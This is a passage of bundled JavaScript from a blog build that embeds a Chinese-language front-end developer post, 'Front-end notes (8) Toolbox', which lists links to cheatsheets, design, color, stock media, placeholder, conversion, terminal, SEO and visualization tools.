target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/Soft_Job/M.1332863702.A.076.html\">[閒聊] 笑談軟體測試的幾個階段（五） 測試權重 - 看板 Soft_Job - 批踢踢實業坊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/Soft_Job/M.1597938487.A.566.html\">[心得] 笑談軟體測試的幾個階段（六） 歷史代碼 - 看板 Soft_Job - 批踢踢實業坊</a></li>\n</ul>\n","date":"2019-07-18T07:16:11.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"2 min read"};

var route_52 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod57
});

var Mod58 = {"title":"前端筆記 (8) Toolbox","slug":"f2e-08-e-tool","html":"<h2 id=\"summary\">Summary</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/EngineLin/Front-End-Checklist\">前端開發者清單</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/f2etw/f2e-notes/issues\">f2e-notes</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/luruke/browser-2020\">browser-2020</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/public-apis/public-apis\">Public APIs</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"cheatsheet\">Cheatsheet</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://hyperpolyglot.org/\">Hyperpolyglot</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://devhints.io/\">Rico&#39;s cheatsheets</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://tldr.sh/\">tldr</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://learnxinyminutes.com/\">Learn X in Y minutes</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/kylelobo/The-Documentation-Compendium\">The-Documentation-Compendium</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://caniuse.com/\">Can I use</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://browserhacks.com/\">browserhacks</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://youmightnotneedjquery.com/\">YOU MIGHT NOT NEED JQUERY</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://tobiasahlin.com/blog/move-from-jquery-to-vanilla-javascript/\">moving from jQuery to vanilla JavaScript</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://1loc.dev/\">1loc | Favorite JavaScript single line of code</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://build-your-own-x.now.sh/\">Build Your Own X</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://animista.net/\">Animista CSS Animations on demand</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"設計用工具\">設計用工具</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://icons8.com/lunacy\">Lunacy</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://ui-cloud.com/\">UICloud</a></td>\n<td>UI 素材資源的搜尋引擎</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://color.adobe.com/zh/create/color-wheel/\">Adobe Kuler</a></td>\n<td>Adobe 的取色工具</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.0to255.com/\">0to255</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://hue360.herokuapp.com/\">HUE/360</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://colorhunt.co/\">Color Hunt</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.happyhues.co/\">Happy Hues</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.materialui.co/colors\">Material Design Colors</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://webcolourdata.com/\">Web Colour Data</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://saint11.org/tools/cchimera/index.html\">CCHIMERA PALETTE CREATOR</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.threebu.it/random-material-palette/\">Random Material Palette Generator - THREEBÙ</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://webgradients.com/\">Fresh Background Gradients | WebGradients.com 💎</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.tagindex.com/color/color_pattern.html\">カラーチャート/配色パターン - TAG index</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/frank890417/full/MpKebd\">SASS 變數色卡</a></td>\n<td>色彩</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.toptal.com/designers/htmlarrows/\">reference for HTML Symbols</a></td>\n<td>HTML 符號</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.invisionapp.com/\">InVision</a></td>\n<td>設計流程溝通工具</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://zeplin.io/\">Zeplin—Collaboration and handoff for product teams</a></td>\n<td>設計流程溝通工具</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"素材\">素材</h2>\n<h3 id=\"標籤產生器\">標籤產生器</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://shields.io/\">Shields.io</a></td>\n<td><code>https://img.shields.io/badge/&lt;LABEL&gt;-&lt;MESSAGE&gt;-&lt;COLOR&gt;</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://badgen.net/\">Badgen</a></td>\n<td><code>https://badgen.net/badge/:subject/:status/:color?icon=iconName</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/fredericojordan/progress-bar\">progress-bar.dev</a></td>\n<td><code>![](progress-bar.dev/28/?title=progress)</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.squarespace.com/logo#\">squarespace</a></td>\n<td>自動產生 LOGO</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.logaster.com/\">logaster</a></td>\n<td>自動產生 LOGO</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"圖庫\">圖庫</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://thenounproject.com/\">Noun Project</a></td>\n<td>圖示、照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://undraw.co/illustrations\">unDraw</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://mixkit.co/free-stock-art/\">Mixkit</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.opendoodles.com/\">Open Doodles</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.openpeeps.com/\">Open Peeps</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.drawkit.io/\">DrawKit</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://isoflat.com/\">IsoFlat</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.freepik.com/stories\">Freepik</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://blush.design/ja\">赤面</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://icons8.com/vector-creator\">Vector Creator</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://illlustrations.co/\">illlustrations</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://absurd.design/\">Absurd Design</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://isometric.online/\">Isometric</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://itg.digital/\">ITG</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://icons8.com/illustrations\">Icons8 Illustrations</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://lukaszadam.com/\">Lukasz Adam</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.humaaans.com/\">Humaaans</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.glazestock.com/\">Glaze</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.manypixels.co/\">ManyPixels</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.777logos.com/\">LOGASTER</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://unsplash.com/\">Unsplash</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.kisscc0.com/\">KissCC0</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://burst.shopify.com/\">Burst</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://kaboompics.com/\">Kaboompics</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://startupstockphotos.com/\">Startup Stock Photos</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.pexels.com/ja-jp/\">Pexels</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://pixabay.com/ja/\">Pixabay</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.photock.jp/\">Photock</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.pakutaso.com/\">ぱくたそ</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://o-dan.net/ja/\">O-DAN（オーダン）</a></td>\n<td>照片</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.irasutoya.com/\">いらすとや</a></td>\n<td>插畫</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"音效\">音效</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://audiojungle.net/\">Audio Jungle</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://soundcloud.com/standingwave\">Standing Wave</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/audiolibrary/music\">Youtube Audio Library</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://koukaongen.com/\">JAPAN STANDARD SOUND EFFECT LIBRARY</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://freesound.org/\">Freesound</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.pond5.com/\">Pond5</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.motionelements.com/zh-hant/sound-effects\">Motion Elements</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://soundeffect-lab.info/\">効果音ラボ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://sounddictionary.info/\">効果音辞典</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://taira-komori.jpn.org/freesoundtw.html\">小森平的免費下載音效</a></li>\n</ul>\n<h3 id=\"音樂\">音樂</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/c/DOVASYNDROMEYouTubeOfficial/videos?view=0&amp;sort=p&amp;flow=grid\">DOVA-SYNDROME</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://maoudamashii.jokersounds.com/music_se.html\">フリー音楽素材/魔王魂</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://amachamusic.chagasi.com/index.html\">甘茶の音楽工房</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://dust-sounds.com/\">DUST SOUNDS</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.tam-music.com/se000_category/phrase\">TAM Music Factory</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.hmix.net/\">H/MIX GALLERY</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://musmus.main.jp/\">MusMus</a></li>\n</ul>\n<h3 id=\"影片\">影片</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.motionelements.com/zh-hant/\">亞洲最大影音素材免版稅買賣平台</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.rocketstock.com/free-after-effects-templates/16-free-4k-light-overlays/\">Rocketstock</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://motionnations.com/2017/12/free-light-leaks-overlay-pack/\">Montion Nations</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.productioncrate.com/\">ProductionCrate</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.coverr.co/\">coverr</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://videos.pexels.com/\">PEXELSVIDEOS</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/user/CATTeRZEYE/videos\">キャターズアイフリー素材チャンネル・CG</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://commons.nicovideo.jp/\">ニコニ･コモンズ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/cossy/n/nac2b21f003dc\">#13 : 動画素材 ① ｜ cossy ｜ note</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/cossy/n/n1120eb304754\">#14 : 動画素材 ② ｜ cossy ｜ note</a></li>\n</ul>\n<h3 id=\"假圖\">假圖</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://fakeimg.pl/\">Fake images please?</a></td>\n<td><code>https://fakeimg.pl/350x200/?text=Hello</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://placeholder.com/\">Placeholder.com</a></td>\n<td><code>https://via.placeholder.com/468x60?text=text</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://picsum.photos/\">Lorem Picsum</a></td>\n<td><code>https://picsum.photos/200/300?random=10</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://placekitten.com/\">placekitten</a></td>\n<td><code>http://placekitten.com/200/300</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://placegoat.com/\">PlaceGoat</a></td>\n<td><code>http://placegoat.com/300/200</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://placeimg.com/\">PlaceIMG</a></td>\n<td><code>https://placeimg.com/300/300/animals</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://placehold.jp\">Placehold.jp</a></td>\n<td><code>http://placehold.jp/150x150.png</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.placecage.com\">PlaceCage</a></td>\n<td><code>https://www.placecage.com/gif/200/300</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://lorempixel.com/\">lorempixel</a></td>\n<td><code>https://lorempixel.com/400/200</code></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://randomuser.me/\">Random User Generator</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://jsonplaceholder.typicode.com/\">JSONPlaceholder</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"文字\">文字</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://lipsum.sugutsukaeru.jp/\">すぐ使えるダミーテキスト</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://skateipsum.com\">Skate Ipsum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://baseballipsum.apphb.com/Home/RestApi\">Baseball Ipsum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jaspervdj/lorem-markdownum\">jaspervdj/lorem-markdownum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://baconipsum.com/json-api/\">Bacon Ipsum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.bobrosslipsum.com/\">Bob Ross Lipsum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.cupcakeipsum.com/\">Cupcake Ipsum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://heisenbergipsum.com/\">Heisenberg Ipsum</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://more.handlino.com/\">MoreText.js 一用就愛上的中文假文生產器</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"轉換\">轉換</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://r12a.github.io/app-conversion/\">Unicode code converter</a></td>\n<td>Unicode 轉各種編碼</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://html2jade.org/\">HTML to JADE/PUG</a></td>\n<td>HTML 轉 JADE/PUG</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://caferati.me/demo/cssfier\">Productivity is key</a></td>\n<td>將 HTML 轉換成 SCSS 結構</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://transform.tools/\">transform</a></td>\n<td>多種網頁常見資料格式互轉</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.webdesignrankings.com/resources/px-em/\">PX-EM</a></td>\n<td>計算子母元素 px 值轉為 em</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://extractcss.com/\">extractCSS</a></td>\n<td>取出 HTML 內的 CSS</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://cssshrink.com/\">CSSShrink</a></td>\n<td>壓縮 CSS</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://gif.ski/\">gifski</a></td>\n<td>號稱品質最強的 GIF converter</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"終端\">終端</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/KoyanagiHitoshi/items/318d4b8ef3b4e5b87390\">アニメーションで学ぶ tmux 入門 ～精選 10 機能～</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/tmuxinator/tmuxinator\">Tmuxiator</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"software\">Software</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://nodejs.org/en/download/\">Node.js</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.postman.com/downloads/\">Postman</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://insomnia.rest/\">Insomnia</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://bootstrap.pypa.io/get-pip.py\">get-pip</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://cmder.net/\">cmder</a></td>\n<td>結合多項軟體，包含 msysgit 與最重要的 ConEmu 和 <a target=\"_blank\" rel=\"nofollow\" href=\"http://mridgers.github.io/clink/\">Clink</a>， msysgit 提供 Git 相關工具與多項 Unix/Linux 環境下常用的指令列工具，例如 <code>less</code>、<code>ls</code>、<code>tar</code>、<code>unzip</code>、<code>md5sum</code>、<code>grep</code>、<code>sed</code>...etc.，<code>Clink</code> 將 GUN Readline 函式庫整合進原生的 Windows 命令提示字元視窗，擁有指令自動完成、查詢歷史指令、基礎行內編輯等功能</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.reactos.org/\">ReactOS</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.tonymacx86.com/\">tonymacx86</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ideone.com/Co5SQv\">IDEOne</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://code.google.com/archive/p/luaforwindows/\">LuaForWindows</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://mingw-w64.org/doku.php/download/mingw-builds\">mingw-w64</a></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"b2e\">B2E</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://dbeaver.io/\">DBeaver</a></td>\n<td>跨平台 SQL 客戶端和資料庫管理工具</td>\n<td>FREE</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://drawsql.app/\">drawSQL</a></td>\n<td>SQL 可視化</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://ngrok.com/\">ngrok</a></td>\n<td>開放內網</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/localtunnel/localtunnel\">localtunnel</a></td>\n<td>開放內網</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://noob.tw/restful-api/\">API 實作(一)：規劃 RESTful API 要注意什麼</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ssllabs.com/\">SSL Labs</a></td>\n<td>安全性檢查</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"seo\">SEO</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://schema.org.cn/\">Schema</a></td>\n<td>由 Google、Bing、Yandex 和 Yahoo! 合作制定出的搜尋引擎標籤結構</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://webcode.tools/open-graph-generator\">產生常用 meta/og 資料</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/speed/pagespeed/insights/\">PageSpeed Insights</a></td>\n<td>檢查 SQL N+1、Cache、Async / defer、Custom Error Response</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.hotjar.com/\">Hotjar</a></td>\n<td>提供分析更進一步的網頁使用者行為分析</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.gandi.net/zh-hant\">Gandi</a></td>\n<td>網域代管</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://tw.godaddy.com/\">GoDaddy</a></td>\n<td>網域代管</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"可視化\">可視化</h2>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>說明</th>\n<th>付費</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://algorithm-visualizer.org/\">【可視化】Algorithm Visualizer</a></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://latentflip.com/loupe/\">【JS 執行可視化】loupe</a></td>\n<td>時序化 JavaScript 程式碼的執行邏輯</td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://bogdan-lyashenko.github.io/js-code-to-svg-flowchart/docs/live-editor/index.html\">js-code-to-svg</a></td>\n<td>圖像化 JavaScript 